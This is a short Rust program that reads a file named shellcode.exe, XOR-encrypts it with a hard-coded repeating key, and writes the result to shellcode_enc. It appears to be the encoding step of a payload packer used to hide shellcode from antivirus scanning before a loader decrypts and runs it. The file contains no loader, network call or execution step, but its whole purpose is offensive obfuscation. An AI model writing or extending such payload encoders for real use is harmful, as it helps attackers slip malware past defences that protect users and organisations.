use std::fs::OpenOptions;
use std::io::{Read, Write};
use std::path::PathBuf;

fn encrypt_data(data: &Vec<u8>, key: &str) -> Vec<u8> {
    let mut encrypted_data = Vec::with_capacity(data.len());

    for (i, &byte) in data.iter().enumerate() {
        let key_byte = key.as_bytes()[i % key.len()];
        encrypted_data.push(byte ^ key_byte);
    }

    encrypted_data
}

fn prepare_binary() -> () {
    let key = "P Q R S T V X Y Z ";

    let path = PathBuf::from("./shellcode.exe");
    let mut file_in = OpenOptions::new()
        .read(true)
        .open(path)
        .expect("Could not open payload file");
    let mut data: Vec<u8> = Vec::new();
    file_in
        .read_to_end(&mut data)
        .expect("Could not read contents.");

    let encrypted = encrypt_data(&data, key);

    let mut file_out = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open("./shellcode_enc")
        .expect("Could not open output file");
    file_out.write(&encrypted).expect("Write error");
}

pub fn main() -> () {
    prepare_binary();
}
